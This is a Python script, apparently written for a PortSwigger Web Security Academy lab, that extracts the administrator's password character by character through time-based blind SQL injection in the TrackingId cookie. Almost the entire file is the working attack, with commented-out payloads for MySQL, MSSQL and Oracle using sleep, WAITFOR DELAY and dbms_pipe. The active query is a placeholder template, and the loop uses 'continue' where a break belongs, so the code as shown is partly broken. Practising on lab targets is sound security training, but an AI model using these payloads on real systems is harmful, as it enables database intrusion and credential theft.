import requests
import time

URL = 'https://acf71f601e10efffc0e673e90076005e.web-security-academy.net/'
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def find_password(tracking_code, session):
    password = ""
    index = 0
    while True:
        time.sleep(0.5)
        found = False
        index = index + 1
        for character in characters:
            sql_query = "SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END"
            # sql_query = "' SELECT IF(SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, {index}, 1) = '{character}') = 1,sleep(10),'a')"
            # sql_query = f"'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, {index}, 1) = '{character}') = 1 WAITFOR DELAY '0:0:05'--"
            # sql_query = f"'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{character}' THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE '' END FROM users WHERE username='administrator')||'"
            response = requests.get(URL, cookies={'TrackingId': f"{tracking_code}{sql_query}", 'session': session})
            print(response.elapsed.total_seconds())
            if response.elapsed.total_seconds() > 5:
                found = True
                print(f"{index} {character}")
                password = password + character
                continue
        if not found:
            print(password)
            break


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    r = requests.get(URL)
    tracking_code = r.cookies['TrackingId']
    session = r.cookies['session']
    find_password(tracking_code, session)
